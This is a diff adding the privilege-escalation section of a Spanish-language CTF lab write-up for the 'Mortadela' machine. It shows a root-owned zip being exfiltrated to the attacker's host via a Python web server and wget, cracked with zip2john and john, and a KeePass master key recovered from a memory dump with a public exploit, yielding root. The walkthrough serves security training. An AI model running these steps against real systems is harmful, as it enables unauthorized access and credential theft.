@@ -424,4 +424,132 @@ zsh: suspended  nc -lvnp 9020
 reset xterm                     
 www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ export TERM=xterm
 ```
-Ahora solo nos queda buscar como escalar privilegios, si vamos enumerando podemos observar que hay un archivo en /opt
+Ahora solo nos queda buscar como escalar privilegios, si vamos enumerando podemos observar que hay un archivo muy peculiar en /opt el cual tenemos permisos de lectura
+```bash
+www-data@mortadela:/$ cd /opt/
+www-data@mortadela:/opt$ ls
+muyconfidencial.zip
+www-data@mortadela:/opt$ ls -la
+total 90880
+drwxr-xr-x  2 root root     4096 Apr  1 19:55 .
+drwxr-xr-x 18 root root     4096 Apr  1 17:41 ..
+-rw-r--r--  1 root root 93052465 Apr  1 19:51 muyconfidencial.zip
+
+```
+Por lo que si tenemos permisos de lectura podemos descargarlo, entoces creamos un servidor con python en la maquina victima
+
+```bash
+www-data@mortadela:/opt$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Ahora desde nuestro lado lo descargamos 
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ wget 10.0.0.156:8000/muyconfidencial.zip 
+--2024-04-05 15:43:09--  http://10.0.0.156:8000/muyconfidencial.zip
+Connecting to 10.0.0.156:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 93052465 (89M) [application/zip]
+Saving to: ‘muyconfidencial.zip’
+
+muyconfidencial.zip                       100%[====================================================================================>]  88.74M   157MB/s    in 0.6s    
+
+2024-04-05 15:43:09 (157 MB/s) - ‘muyconfidencial.zip’ saved [93052465/93052465]
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ ls -la  
+total 90880
+drwxr-xr-x 2 kali kali     4096 Apr  5 15:43 .
+drwxr-xr-x 3 kali kali     4096 Apr  5 15:04 ..
+-rw-r--r-- 1 kali kali 93052465 Apr  1 13:51 muyconfidencial.zip
+
+```
+Si intentamos descomprimirlo nos pide una contraseña por lo que vamos intentar obternerla con john, primero hay que pasar la contraseña del zip a un hash para poder tratarlo john, para esto john tiene bastantes herramienta en este caso se llama "zip2john"
+
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ unzip muyconfidencial.zip 
+Archive:  muyconfidencial.zip
+[muyconfidencial.zip] Database.kdbx password: 
+   skipping: Database.kdbx           incorrect password
+   skipping: KeePass.DMP             incorrect password
+
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ zip2john muyconfidencial.zip > hash_muyconfidencial               
+ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0
+ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+```
+Una vez hecho eso podemos pasarlo por john
+
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_muyconfidencial
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ xxxxxxxx         (hash_muyconfidencial.zip/hash_muyconfidencial)     
+1g 0:00:00:00 DONE (2024-04-05 15:55) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+(Tapo la contraseña para que no se sepa)
+```
+Una vez tenemos la contraseña podemos descomprimir el zip y vemos que hay, 2 archivos, uno es un archivo el cual sirve para gestionar contraseñas de forma segura ya que sin la contraseña maestra esta todo encriptado y el otro es el dumpeo de este archvivo
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ unzip muyconfidencial.zip
+Archive:  muyconfidencial.zip
+[muyconfidencial.zip] Database.kdbx password: 
+ extracting: Database.kdbx           
+  inflating: KeePass.DMP
+```
+Si vemos que hay algun dumpeo del keepass, podemos aprovecharnos de este dumpeo para sacar la contraseña
+El exploit que voy a utilizar es este : https://github.com/z-jxy/keepass_dump
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ python3 keepass_dump.py -f ./KeePass.DMP 
+[*] Searching for masterkey characters
+[-] Couldn't find jump points in file. Scanning with slower method.
+[*] 0:  {UNKNOWN}
+[*] 1:  x
+[*] 2:  x
+[*] 3:  x
+[*] 4:  x
+[*] 5:  x
+[*] 6:  x
+[*] 7:  x
+[*] 8:  x
+[*] 9:  x
+[*] 10: x
+[*] 11: x
+[*] 12: x
+[*] 13: x
+[*] Extracted: {UNKNOWN}xxxxxxxxxx
+(Tapo la contraseña para que no se sepa)
+```
+Nos da todos los caracteres menos el primero, pero con un poco de paciencia se saca, una vez que tenemos la clave maestra podemos abrir el archivo keepass, yo utilizo keepassxc para abrilo en linux pero hay bastantes mas
+```bash
+┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
+└─$ keepassxc Database.kdbx 
+```
+![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_r89O4LAAZE.png?raw=true)
+Una vez dentro parece que se encuentra la contraseña de root
+![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_tWacrZ04Ai.png?raw=true)
+
+Y efectivamente es la contraseña de root
+
+```bash
+www-data@mortadela:/opt$ su root
+Password: 
+root@mortadela:/opt# id
+uid=0(root) gid=0(root) grupos=0(root)
+root@mortadela:/opt# cat /home/mortadela/user.txt 
+flag{user}
+root@mortadela:/opt# cat /root/root.txt 
+flag{root}
+
+```
+Y hemos podido obtener abmas flags
